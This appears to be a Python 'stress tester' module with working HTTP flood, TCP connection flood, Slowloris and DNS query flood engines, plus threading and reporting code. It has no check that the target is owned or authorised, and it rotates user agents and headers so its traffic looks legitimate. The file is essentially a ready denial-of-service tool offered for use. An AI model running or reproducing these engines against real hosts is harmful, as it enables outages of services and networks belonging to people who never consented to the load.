import concurrent.futures
import random
import socket
import threading
import time
from datetime import datetime
from typing import Dict, Optional
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from utils.logger import get_module_logger

logger = get_module_logger("stress_tester")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
]


class StatsCollector:
    def __init__(self):
        self.lock = threading.Lock()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.end_time = None
        self.errors = []

    def start(self):
        self.start_time = time.time()

    def stop(self):
        self.end_time = time.time()

    def add_request(self, success: bool, error: Optional[str] = None):
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
                if error:
                    self.errors.append(error)

    def get_rps(self) -> float:
        if self.start_time is None:
            return 0.0
        elapsed = time.time() - self.start_time
        if elapsed == 0:
            return 0.0
        return self.total_requests / elapsed

    def get_success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful_requests / self.total_requests) * 100

    def get_duration(self) -> float:
        if self.start_time is None:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    def get_summary(self) -> Dict:
        return {
            "total_requests": self.total_requests,
            "successful": self.successful_requests,
            "failed": self.failed_requests,
            "success_rate": round(self.get_success_rate(), 2),
            "avg_rps": round(self.get_rps(), 2),
            "duration": round(self.get_duration(), 2),
            "errors": self.errors[:10],
        }


class StressEngine:
    def __init__(self, target: str, threads: int, duration: int):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = StatsCollector()
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _random_headers(self) -> Dict:
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        }

    def _generate_payload(self) -> bytes:
        return b"".join(random.choices(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(10, 100)))

    def run(self) -> StatsCollector:
        self.stats.start()
        self.running = True

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._worker, i) for i in range(self.threads)]

            start_time = time.time()
            while self.running and (time.time() - start_time) < self.duration:
                time.sleep(0.5)

            self.running = False
            self.stats.stop()

            concurrent.futures.wait(futures, timeout=10)

        return self.stats

    def _worker(self, worker_id: int):
        raise NotImplementedError


class HTTPStressEngine(StressEngine):
    def __init__(self, target: str, threads: int, duration: int, method: str = "GET"):
        super().__init__(target, threads, duration)
        self.method = method.upper()
        self.parsed_target = urlparse(target if target.startswith("http") else f"http://{target}")
        self.base_url = f"{self.parsed_target.scheme or 'http'}://{self.parsed_target.netloc}"
        self.paths = ["/", "/index.html", "/login", "/api", "/health", "/ping", "/static", "/assets"]

    def _worker(self, worker_id: int):
        while self.running:
            try:
                path = random.choice(self.paths)
                url = f"{self.base_url}{path}"
                headers = self._random_headers()

                if self.method == "GET":
                    response = self.session.get(url, headers=headers, timeout=5)
                else:
                    response = self.session.post(url, headers=headers, data=self._generate_payload(), timeout=5)

                self.stats.add_request(response.status_code < 500)

            except requests.exceptions.Timeout:
                self.stats.add_request(False, "Timeout")
            except requests.exceptions.ConnectionError:
                self.stats.add_request(False, "ConnectionError")
            except Exception as e:
                self.stats.add_request(False, str(e)[:50])


class TCPStressEngine(StressEngine):
    def __init__(self, target: str, threads: int, duration: int):
        super().__init__(target, threads, duration)
        self.port = 80
        if ":" in target:
            parts = target.split(":")
            self.target = parts[0]
            self.port = int(parts[1])

    def _worker(self, worker_id: int):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target, self.port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                sock.close()
                self.stats.add_request(True)
            except socket.timeout:
                self.stats.add_request(False, "Timeout")
            except ConnectionRefusedError:
                self.stats.add_request(False, "ConnectionRefused")
            except Exception as e:
                self.stats.add_request(False, str(e)[:30])


class SlowlorisEngine(StressEngine):
    def __init__(self, target: str, threads: int, duration: int):
        super().__init__(target, threads, duration)
        self.port = 80
        if ":" in target:
            parts = target.split(":")
            self.target = parts[0]
            self.port = int(parts[1])

    def _worker(self, worker_id: int):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target, self.port))

                headers = [
                    f"GET /{random.randint(1, 1000)} HTTP/1.1",
                    f"Host: {self.target}",
                    f"User-Agent: {random.choice(USER_AGENTS)}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9",
                ]
                for header in headers:
                    sock.send(header.encode() + b"\r\n")
                    time.sleep(random.uniform(0.1, 0.5))

                while self.running:
                    time.sleep(5)
                    sock.send(b"X-Client: keep-alive\r\n")

                sock.close()
                self.stats.add_request(True)

            except Exception as e:
                self.stats.add_request(False, str(e)[:30])
                time.sleep(1)


class DNSStressEngine(StressEngine):
    def __init__(self, target: str, threads: int, duration: int):
        super().__init__(target, threads, duration)
        self.dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
        self.subdomains = ["www", "mail", "ftp", "admin", "dev", "api", "test", "stage", "backup", "webmail"]

    def _worker(self, worker_id: int):
        while self.running:
            try:
                sub = random.choice(self.subdomains)
                domain = f"{sub}.{self.target}"
                server = random.choice(self.dns_servers)

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)

                query = self._build_dns_query(domain)
                sock.sendto(query, (server, 53))
                sock.recvfrom(1024)
                sock.close()

                self.stats.add_request(True)

            except socket.timeout:
                self.stats.add_request(False, "DNS Timeout")
            except Exception as e:
                self.stats.add_request(False, str(e)[:30])

    def _build_dns_query(self, domain: str) -> bytes:
        header = bytearray(12)
        header[0:2] = b'\xAA\xAA'
        header[2:4] = b'\x01\x00'
        header[4:6] = b'\x00\x01'

        qname = b""
        for part in domain.split("."):
            qname += bytes([len(part)]) + part.encode()
        qname += b"\x00"
        qtype = b"\x00\x01"
        qclass = b"\x00\x01"

        return bytes(header) + qname + qtype + qclass


def create_engine(method: str, target: str, threads: int, duration: int) -> StressEngine:
    engines = {
        "http": HTTPStressEngine,
        "https": HTTPStressEngine,
        "tcp": TCPStressEngine,
        "slowloris": SlowlorisEngine,
        "dns": DNSStressEngine,
    }

    engine_class = engines.get(method.lower(), HTTPStressEngine)
    if method.lower() == "https":
        return HTTPStressEngine(target, threads, duration, method="GET")
    return engine_class(target, threads, duration)


def generate_report(target: str, method: str, threads: int, stats: StatsCollector) -> str:
    summary = stats.get_summary()

    lines = []
    lines.append("═══════════════════════════════════════════")
    lines.append("  DOMAIN STRESS TEST REPORT")
    lines.append("═══════════════════════════════════════════")
    lines.append(f"  Target: {target}")
    lines.append(f"  Method: {method}")
    lines.append(f"  Threads: {threads}")
    lines.append(f"  Duration: {summary['duration']:.1f}s")
    lines.append("═══════════════════════════════════════════")
    lines.append("")
    lines.append("▸ STATISTICS")
    lines.append(f"  Total Requests: {summary['total_requests']:,}")
    lines.append(f"  Successful: {summary['successful']:,} ({summary['success_rate']:.1f}%)")
    lines.append(f"  Failed: {summary['failed']:,} ({100 - summary['success_rate']:.1f}%)")
    lines.append(f"  Avg RPS: {summary['avg_rps']:.2f}")
    lines.append("")

    if stats.errors:
        lines.append("▸ ERRORS (last 10)")
        for error in stats.errors[:10]:
            lines.append(f"  - {error}")
        lines.append("")

    lines.append("═══════════════════════════════════════════")
    lines.append("  TEST COMPLETED")
    lines.append("═══════════════════════════════════════════")

    return "\n".join(lines)


def run_stress(target: str, method: str = "http", threads: int = 50, duration: int = 10):
    engine = create_engine(method, target, threads, duration)
    stats = engine.run()
    report = generate_report(target, method, threads, stats)
    return {
        "target": target,
        "method": method,
        "threads": threads,
        "stats": stats.get_summary(),
        "report": report,
    }


def run(config=None):
    if config is None:
        config = {}
    target = config.get("target", "")
    if not target:
        raise ValueError("Target is required")
    method = config.get("method", "http")
    threads = config.get("threads", 50)
    duration = config.get("duration", 10)
    return run_stress(target, method, threads, duration)
